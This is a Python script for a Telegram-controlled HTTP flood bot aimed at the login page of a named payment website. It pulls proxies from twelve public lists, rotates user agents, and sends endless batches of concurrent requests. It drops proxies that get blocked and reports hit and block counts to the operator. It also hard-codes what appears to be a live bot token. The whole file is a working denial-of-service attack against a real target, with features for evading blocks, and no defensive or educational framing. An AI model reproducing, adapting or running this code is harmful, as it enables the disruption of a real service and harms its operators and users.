import asyncio
import aiohttp
import random
from telebot.async_telebot import AsyncTeleBot

# ==========================================
# CONFIGURATION
# ==========================================
BOT_TOKEN = "8607797493:AAFjRgGRpHRmKoQBBoWzCP7TQxa2QqncZC8"  
TARGET_URL = "https://www.elitepay.co.in/login"
DOMAIN = "www.elitepay.co.in"

bot = AsyncTeleBot(BOT_TOKEN)

# Global stats and proxy pool
stats = {
    "total_sent": 0,
    "success_200": 0,
    "blocked_403": 0,
    "rate_limited_429": 0,
    "proxy_errors": 0,
    "last_status": "Fetching Proxies from 12+ Sources...",
    "last_preview": "None"
}

proxy_pool = []

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; CPH2681) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.8010.36 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
]

# 12+ Free Proxy Repositories and APIs
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monoline/proxy-list/main/proxies.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt"
]

# Fetch Proxies from all sources concurrently
async def fetch_proxy_pool():
    global proxy_pool
    temp_proxies = []
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in PROXY_SOURCES:
            tasks.append(fetch_from_source(session, url))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for res in results:
            if isinstance(res, list):
                temp_proxies.extend(res)
                
    if not temp_proxies:
        temp_proxies = ["DIRECT"]
    else:
        temp_proxies = list(set(temp_proxies))  # Duplicate remove karne ke liye
        random.shuffle(temp_proxies)
        
    proxy_pool = temp_proxies
    print(f"[+] Total loaded {len(proxy_pool)} unique proxies from repositories.")

async def fetch_from_source(session, url):
    proxies = []
    try:
        async with session.get(url, timeout=10) as resp:
            if resp.status == 200:
                text = await resp.text()
                for line in text.splitlines():
                    line = line.strip()
                    if line and ":" in line:
                        proxies.append(f"http://{line}")
    except Exception:
        pass
    return proxies

# Single Request Worker using Dynamic Proxy
async def fire_request(session):
    global stats, proxy_pool
    
    if not proxy_pool:
        proxy = None
    else:
        proxy = random.choice(proxy_pool)
        
    headers = {
        "Host": DOMAIN,
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Referer": f"https://{DOMAIN}/",
        "Accept-Language": "en-US,en;q=0.9",
    }
    
    proxy_url = None if proxy == "DIRECT" else proxy

    try:
        timeout = aiohttp.ClientTimeout(total=15, connect=5, sock_read=10)
        async with session.get(TARGET_URL, headers=headers, proxy=proxy_url, timeout=timeout) as response:
            text = await response.text()
            stats["total_sent"] += 1
            stats["last_status"] = str(response.status)
            stats["last_preview"] = (text[:50] + '..') if len(text) > 50 else text.strip()

            if response.status == 200:
                stats["success_200"] += 1
            elif response.status == 403:
                stats["blocked_403"] += 1
                if proxy in proxy_pool:
                    proxy_pool.remove(proxy)
            elif response.status == 429:
                stats["rate_limited_429"] += 1
            else:
                stats["proxy_errors"] += 1
    except Exception:
        stats["total_sent"] += 1
        stats["proxy_errors"] += 1
        stats["last_status"] = "ERR/DEAD"
        if proxy and proxy in proxy_pool:
            proxy_pool.remove(proxy)

# Background Worker loop with Auto Proxy Refresh
async def continuous_flood_worker():
    global proxy_pool
    await fetch_proxy_pool()
    
    batch_size = 150  
    connector = aiohttp.TCPConnector(limit=400, limit_per_host=400, force_close=True)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            if len(proxy_pool) < 20:
                await fetch_proxy_pool()
                
            tasks = [fire_request(session) for _ in range(batch_size)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.005)

# /start Command
@bot.message_handler(commands=['start'])
async def handle_start(message):
    welcome_text = (
        "⚡ **Multi-Repo Proxy Rotation Bot Running**\n\n"
        "Commands:\n"
        "➔ `/status` - Live proxy stats aur active pool check karne ke liye."
    )
    await bot.reply_to(message, welcome_text, parse_mode='Markdown')

# /status Command
@bot.message_handler(commands=['status'])
async def handle_status(message):
    status_text = (
        "📊 **Live Multi-Repo Proxy Stats**\n\n"
        f"🎯 **Target:** `elitepay.co.in/login`\n"
        f"🌐 **Active Proxies in Pool:** `{len(proxy_pool)}`\n"
        f"🚀 **Total Hits Sent:** `{stats['total_sent']}`\n"
        f"✅ **Success (200):** `{stats['success_200']}`\n"
        f"🚫 **Blocked (403):** `{stats['blocked_403']}`\n"
        f"⚠️ **Dead/Proxy Errors:** `{stats['proxy_errors']}`\n\n"
        f"📡 **Last Status:** `{stats['last_status']}`\n"
        f"📝 **Latest Response:** `{stats['last_preview']}`"
    )
    await bot.reply_to(message, status_text, parse_mode='Markdown')

async def main():
    print("Multi-Repo Proxy Rotation Loop Started...")
    asyncio.create_task(continuous_flood_worker())
    await bot.polling(non_stop=True)

if __name__ == "__main__":
    asyncio.run(main())
    
